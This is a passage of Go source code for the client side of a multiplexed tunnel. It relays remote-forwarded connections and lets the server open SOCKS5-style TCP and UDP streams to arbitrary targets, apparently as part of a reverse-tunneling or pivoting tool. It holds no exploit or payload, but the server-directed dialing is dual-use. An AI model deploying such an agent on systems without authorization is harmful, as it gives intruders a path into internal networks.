	}
}

func remoteTunnelAcceptLoop(ctx context.Context, ln net.Listener, sess *mux.Session, remoteAddr string) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Fprintf(os.Stderr, "[!] Panic in remote tunnel accept loop: %v\n", r)
		}
	}()
	go func() {
		<-ctx.Done()
		ln.Close()
	}()
	for {
		conn, err := ln.Accept()
		if err != nil {
			if ctx.Err() != nil || errors.Is(err, net.ErrClosed) {
				return
			}
			continue
		}
		go remoteTunnelRelay(conn, sess, remoteAddr)
	}
}

func remoteTunnelRelay(conn net.Conn, sess *mux.Session, remoteAddr string) {
	defer conn.Close()
	relay.TuneConn(conn)
	stream, err := sess.Open()
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] Remote tunnel: failed to open yamux stream: %v\n", err)
		return
	}
	defer stream.Close()

	// Write stream type header: [0x02] [2-byte addr len BE] [addr bytes]
	addrBytes := []byte(remoteAddr)
	hdr := make([]byte, 3+len(addrBytes))
	hdr[0] = 0x02 // Stream type: remote tunnel
	binary.BigEndian.PutUint16(hdr[1:3], uint16(len(addrBytes)))
	copy(hdr[3:], addrBytes)
	if _, err := stream.Write(hdr); err != nil {
		fmt.Fprintf(os.Stderr, "[!] Remote tunnel: failed to write header: %v\n", err)
		return
	}

	// Bidirectional relay between incoming connection and yamux stream
	done := make(chan struct{}, 2)
	go func() {
		defer func() { done <- struct{}{} }()
		relay.CopyBuffered(stream, conn)
		if tc, ok := stream.(interface{ CloseWrite() error }); ok {
			tc.CloseWrite()
		} else {
			stream.Close()
		}
	}()
	go func() {
		defer func() { done <- struct{}{} }()
		relay.CopyBuffered(conn, stream)
		if tc, ok := conn.(interface{ CloseWrite() error }); ok {
			tc.CloseWrite()
		}
	}()
	<-done
	time.Sleep(50 * time.Millisecond)
	conn.Close()
	stream.Close()
	<-done

}


// acceptProxyStreams accepts server-initiated yamux streams for SOCKS5 proxy
// routing. Each stream carries a [2-byte addr len][addr] header followed by
// bidirectional TCP relay to the target.
func acceptProxyStreams(ctx context.Context, sess *mux.Session) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Fprintf(os.Stderr, "[!] Panic in proxy stream acceptor: %v\n", r)
		}
	}()
	for {
		stream, err := sess.Accept()
		if err != nil {
			if ctx.Err() != nil {
				return
			}
			return
		}
		go handleProxyStream(ctx, stream)
	}
}

func handleProxyStream(_ context.Context, stream net.Conn) {
	typeBuf := make([]byte, 1)
	if _, err := io.ReadFull(stream, typeBuf); err != nil {
		stream.Close()
		return
	}

	switch typeBuf[0] {
	case 0x00:
		handleProxyStreamTCP(stream)
	case 0x01:
		handleProxyStreamUDP(stream)
	case 0x02:
		handleProxyStreamTCP(stream)
	default:
		stream.Close()
	}
}

func handleProxyStreamTCP(stream net.Conn) {
	lenBuf := make([]byte, 2)
	if _, err := io.ReadFull(stream, lenBuf); err != nil {
		stream.Close()
		return
	}
	addrLen := binary.BigEndian.Uint16(lenBuf)
	if addrLen == 0 || addrLen > 512 {
		stream.Close()
		return
	}
	addrBuf := make([]byte, addrLen)
	if _, err := io.ReadFull(stream, addrBuf); err != nil {
		stream.Close()
		return
	}
	target := string(addrBuf)

	network := "tcp"
	if !strings.Contains(target, "[") {
		network = "tcp4"
	}
	conn, err := net.DialTimeout(network, target, 10*time.Second)
	if err != nil {
		stream.Close()
		return
	}
	defer conn.Close()
	relay.TuneConn(conn)

	done := make(chan struct{}, 2)
	go func() {
		defer func() { done <- struct{}{} }()
		relay.CopyBuffered(conn, stream)
		if tc, ok := conn.(interface{ CloseWrite() error }); ok {
			tc.CloseWrite()
		}
	}()
	go func() {
		defer func() { done <- struct{}{} }()
		relay.CopyBuffered(stream, conn)
		if tc, ok := stream.(interface{ CloseWrite() error }); ok {
			tc.CloseWrite()
		} else {
			stream.Close()
		}
	}()
	<-done
	time.Sleep(50 * time.Millisecond)
	conn.Close()
	stream.Close()
	<-done

}


func handleProxyStreamUDP(stream net.Conn) {
	defer stream.Close()

	// Read [addr_len:2][addr][payload_len:2][payload]
	addrLenBuf := make([]byte, 2)
	if _, err := io.ReadFull(stream, addrLenBuf); err != nil {
		return
	}
	addrLen := binary.BigEndian.Uint16(addrLenBuf)
	if addrLen == 0 || addrLen > 512 {
		return
	}
	addrBuf := make([]byte, addrLen)
	if _, err := io.ReadFull(stream, addrBuf); err != nil {
		return
	}
	target := string(addrBuf)

	payloadLenBuf := make([]byte, 2)
	if _, err := io.ReadFull(stream, payloadLenBuf); err != nil {
		return
	}
	payloadLen := binary.BigEndian.Uint16(payloadLenBuf)
	payload := make([]byte, payloadLen)
	if payloadLen > 0 {
		if _, err := io.ReadFull(stream, payload); err != nil {
			return
		}
	}

	// Dial UDP, send, receive.
	network := "udp"
	if !strings.Contains(target, "[") {
		network = "udp4"
	}
	conn, err := net.DialTimeout(network, target, 5*time.Second)
	if err != nil {
		// Write zero-length response to signal error.
		stream.Write([]byte{0x00, 0x00})
		return
	}
	defer conn.Close()

	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if _, err := conn.Write(payload); err != nil {
		stream.Write([]byte{0x00, 0x00})
		return
	}

	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	resp := make([]byte, 65535)
	n, err := conn.Read(resp)
	if err != nil {
		stream.Write([]byte{0x00, 0x00})
		return
	}

	// Write response: [resp_len:2][resp bytes]
	respHeader := make([]byte, 2)
	binary.BigEndian.PutUint16(respHeader, uint16(n))
	stream.Write(respHeader)
	stream.Write(resp[:n])
}
